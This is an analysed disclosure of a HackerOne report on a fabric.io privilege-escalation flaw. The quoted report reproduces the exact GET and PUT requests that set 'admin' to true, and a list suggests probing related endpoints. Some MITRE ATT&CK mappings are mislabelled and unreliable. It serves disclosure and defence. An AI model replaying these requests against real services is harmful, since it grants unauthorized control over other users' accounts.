# Privilege Escalation via Unprotected Account Update Endpoint - fabric.io

## Metadata
- **Source:** HackerOne
- **Report:** 42961 | https://hackerone.com/reports/42961
- **Submitted:** 2015-01-08
- **Reporter:** satishb3
- **Program:** fabric.io
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Privilege Escalation, Broken Access Control, Insecure Direct Object Reference (IDOR), Missing Authorization Check
- **CVEs:** None
- **Category:** auth-crypto

## Summary
A non-admin team member can escalate their privileges to admin by directly modifying their own account record via an unprotected PUT endpoint. The vulnerability exists because the /accounts/{id} endpoint fails to verify whether the requester has authorization to modify account privilege levels, allowing any authenticated user to set their own admin flag to true.

## Attack scenario
1. Attacker (Alice) authenticates to fabric.io as a regular member of an organization's app
2. Attacker navigates to team members page to retrieve their own user ID from the API response (54aa4ab19ea6961359001260)
3. Attacker crafts a PUT request to /accounts/{their_id} with JSON body containing {"admin":true}
4. Attacker includes valid X-CSRF-Token and sets Content-Type to application/json (bypassing any weak content-type validation)
5. The server accepts the request without verifying the user has permission to modify admin status
6. Attacker's role is updated to admin, granting full control over all team members and application settings

## Root cause
The /accounts/{id} endpoint implements insufficient authorization checks. While it likely validates that the user is authenticated, it fails to enforce that only administrators or the account owner (with restrictions) can modify sensitive fields like the admin flag. The endpoint appears to accept any field modification from any authenticated user without role-based access control validation.

## Attacker mindset
An opportunistic insider threat actor or disgruntled employee seeking to escalate privileges. The attack is straightforward - probe the API surface to find unprotected endpoints, identify the IDOR vulnerability, and exploit it for privilege escalation. The attacker recognizes that JSON content-type is mandatory, suggesting they may have tested multiple payloads or formats.

## Defensive takeaways
- Implement strict authorization checks on all endpoints that modify sensitive fields; never trust that sensitive attributes (admin flag, roles) can be safely modified based on authentication alone
- Use role-based access control (RBAC) to restrict who can modify privilege-escalation fields; typically only super-admins should modify admin status
- Apply the principle of least privilege: restrict /accounts/{id} endpoints to either super-admin only or self-modification with denied sensitive fields
- Implement field-level authorization: certain fields like 'admin', 'role', 'permissions' should never be modifiable by non-admin users, even via self-modification
- Add comprehensive audit logging for all privilege modifications with alerting on admin flag changes
- Validate that sensitive state changes (privilege escalation) originate from legitimate administrative workflows, not direct API calls
- Perform security testing of API endpoints specifically targeting privilege escalation scenarios and IDOR vulnerabilities
- Consider requiring multi-factor confirmation or approval workflows for privilege level changes

## Variant hunting
Test other sensitive user fields (organization_admin, superuser, permissions array) for similar modification vulnerabilities
Check if other endpoints like /users/{id}, /organizations/{id}/members/{id}, or /teams/{id}/users/{id} have similar issues
Test if the vulnerability applies to other protected resources (organization-level admin, app-level permissions)
Determine if the vulnerability exists across other Fabric.io products or APIs (Crashlytics, Beta, etc.)
Check if removing X-CSRF-Token header still allows the modification, indicating additional auth bypass potential
Test with different Content-Types to see if the mandatory JSON requirement is actually enforced or if it's a false positive
Investigate if batch operations or bulk update endpoints have similar authorization gaps
Check if the same user can modify other users' admin status via /accounts/{other_user_id}

## MITRE ATT&CK
- T1078 - Valid Accounts (using legitimate authentication)
- T1548 - Abuse Elevation Control Mechanism (privilege escalation)
- T1613 - Sensitive Information Types Reconnaissance (discovering API structure)
- T1135 - Network Share Discovery (API endpoint discovery)

## Notes
The report is well-structured with clear reproduction steps. The attacker notes that Content-Type: application/json is mandatory, suggesting this may have been discovered through trial-and-error testing of different payloads. This is a textbook IDOR combined with missing authorization checks. The fact that a regular GET request reveals the user ID makes the attack trivial to execute. No indication of scope limitation is provided - unclear if this affects only the reporting user's account or if they can modify other users' admin status as well (likely the latter, which would be even more severe).

## Full report
<details><summary>Expand</summary>

Let say, Alice is a member of TestApp.

-> Log into fabric.io as Alice and navigate to settings.
-> Click on Apps and choose TestApp.
-> Click on team members link and notice that Alice role is Member. 

Clicking on team members link sends a similar request as shown below. 

GET /api/v2/organizations/[orgid]/apps/[appid]/team_members HTTP/1.1
Host: fabric.io
...

Response to the above request displays the Alice id as shown below.
..{"name":"alice","email":"alice@mailinator.com","id":"54aa4ab19ea6961359001260","is_activated":true,"is_admin":false}]

-> Use the alice id and send the below shown PUT request.

PUT /accounts/54aa4ab19ea6961359001260 HTTP/1.1
Host: fabric.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=UTF-8
X-CSRF-Token: ...
X-CRASHLYTICS-DEVELOPER-TOKEN: ...
X-Requested-With: XMLHttpRequest
Referer: https://fabric.io/settings/apps/54ad5e03a25bb8136b000002/team_members
Cookie: _fabric_session=...
Connection: keep-alive
Content-Length: 17

{"admin":true}

 Note: In the above request Content-Type: application/json; charset=UTF-8 is mandatory. 

-> It changes the Alice role to Admin.
-> Refresh the browser and navigate to TestApp team members. You will notice Alice role is Admin. Now, Alice can change/delete all other users in the team.

</details>

---
*Analysed by Claude on 2026-05-24*
